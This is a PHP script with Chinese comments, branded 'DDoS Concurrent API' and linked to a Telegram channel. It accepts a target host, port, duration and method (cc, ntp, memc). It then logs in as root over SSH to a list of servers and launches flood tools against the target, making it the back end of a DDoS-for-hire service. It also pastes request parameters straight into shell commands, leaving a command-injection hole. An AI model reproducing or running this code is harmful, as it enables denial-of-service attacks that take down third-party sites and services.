<?php
########################################################################################################################
# DDoS Concurrent API - PHP
# TG: https://t.me/DDoS_DataStation
########################################################################################################################
# 初始化
header("Content-Type: application/json; charset=utf-8");
error_reporting(E_ALL^E_NOTICE^E_WARNING);
ignore_user_abort(true);
set_time_limit(3000);

# 设置
$Set = array(
    # 程序目录
    'AppDir' => '/home/',

    # 线程
    'Thread' => 100,

    # 时间上限 (秒)
    'TimeLimit' => 600
);

# 服务器 SSH 信息
$Servers = array(
    ['Host' => '192.168.0.1', 'Port' => 22, 'UserName' => 'root', 'Password' => ''], # 主机1
    ['Host' => '192.168.0.2', 'Port' => 22, 'UserName' => 'root', 'Password' => ''], # 主机2
    ['Host' => '192.168.0.3', 'Port' => 22, 'UserName' => 'root', 'Password' => ''], # 主机3
    # ...
);

# 秘钥
$Keys = array(
    'key',
);

# 方法
$Methods = array(
    'cc',
    'ntp',
    'memc',
);
########################################################################################################################
# 接收传递参数 GET POST 通用
$Key = $_REQUEST['key'];
$Max = $_REQUEST['max'];
$Host = $_REQUEST['host'];
$Port = intval($_REQUEST['port']);
$Time = intval($_REQUEST['time']);
$Method = strtolower($_REQUEST['method']);
########################################################################################################################
# 验证
if (!function_exists("ssh2_connect")) die("错误：服务器未安装 PHP-SSH2 扩展");
if (empty($Key)) die("错误：接口秘钥(API Key) 为空");
if (!in_array($Key, $Keys) && $Set['AdminKey'] !== $Key) die("错误：接口秘钥(API Key) \"$Key\" 不存在");
if (empty($Max)) die("错误：并发(Max) 为空");
if (empty($Host)) die("错误：主机(Host) 为空");
if (empty($Port)) die("错误：端口(Port) 为空");
if (empty($Time)) die("错误：时间(Time) 为空");
if (empty($Method)) die("错误：方法(Method) 为空");
if (!in_array($Method, $Methods)) die("错误：方法(Method) \"$Method\" 不存在");
if ($Port > 65535 || $Port < 1) die("错误：端口(Port) \"$Port\" 错误，端口不可大于 65535");
if ($Max > count($Servers)) die("错误：并发(Max) \"$Max\" 错误，没有足够的服务器执行并发任务");
if ($Time > $Set['TimeLimit'] || $Time < 5) die("错误：时间(Time) 不能大于 ".$Set['TimeLimit']." 秒或小于 5 秒");
########################################################################################################################
# 默认命令
$Command = $Set['AppDir'].$Method.' '.$Host.' '.$Port.' '.$Set['AppDir'].$Method.'.txt '.$Set['Thread'].' -1 '.$Time;

# 自定义命令
if ($Method === 'cc') {
    $Command = $Set['AppDir'].$Method.' '.$Host.' '.$Time.' '.$Set['AppDir'].$Method.'.txt';
    # CC 脚本命令格式不同一，请根据脚本参数格式自行修改提交命令
    # /home/cc http://192.168.0.1 300 /home/cc.txt
}

# 调试命令
//exit('您将要执行的命令为：'.$Command);
//$Command = 'ping baidu.com';
########################################################################################################################
# SSH
$ResServers = '【DDoS Concurrent API - PHP】'.PHP_EOL.'TG: https://t.me/DDoS_Data_Station'.PHP_EOL.PHP_EOL;
$ResServers .= '并发(Max)：'.$Max.PHP_EOL;
$ResServers .= '主机(Host)：'.$Host.PHP_EOL;
$ResServers .= '端口(Port)：'.$Port.PHP_EOL;
$ResServers .= '时间(Time)：'.$Time.'s'.PHP_EOL;
$ResServers .= '方法(Method)：'.$Method.PHP_EOL.PHP_EOL;
foreach ($Servers as $i => $res){
    $i++;
    if (!($conn = ssh2_connect($res['Host'], (int)$res['Port']))) {
        $ResServers .= "主机 $i => SSH 连接失败".PHP_EOL;
        continue;
    }
    if (!ssh2_auth_password($conn, $res['UserName'], $res['Password'])) {
        $ResServers .= "主机 $i => SSH 用户名或密码错误".PHP_EOL;
        continue;
    }
    if (($str = ssh2_exec($conn, $Command))) {
        stream_set_blocking($str, false);
        $data = "";
        while ($buf = fread($str,4096)) $data .= $buf;
        $ResServers .= "主机 $i => SSH 提交成功".PHP_EOL;
    }
    else $ResServers .= "主机 $i => SSH 命令执行失败".PHP_EOL;
    if ($i >= $Max) exit($ResServers);
}
exit($ResServers);
########################################################################################################################